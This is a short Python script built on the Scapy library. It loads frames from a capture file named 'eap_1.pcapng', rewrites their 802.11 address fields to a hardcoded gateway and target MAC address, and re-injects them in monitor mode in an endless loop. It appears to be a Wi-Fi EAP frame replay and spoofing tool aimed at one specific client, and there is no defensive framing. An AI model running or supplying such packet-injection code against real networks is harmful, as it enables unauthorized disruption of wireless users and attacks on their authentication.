from scapy.all import *
target_mac = 'f0:8a:76:fd:12:42'
gateway_mac = '70:5d:cc:f1:33:ad'

conf.iface = "802.11n USB Wireless LAN Card"

def eap_sniff(pkt):
	pkt[Dot11].addr1 = gateway_mac
	pkt[Dot11].addr2 = gateway_mac
	pkt[Dot11].addr3 = target_mac
	sendp(pkt, monitor=True)

while(1):
	sniff(offline='eap_1.pcapng', prn=eap_sniff)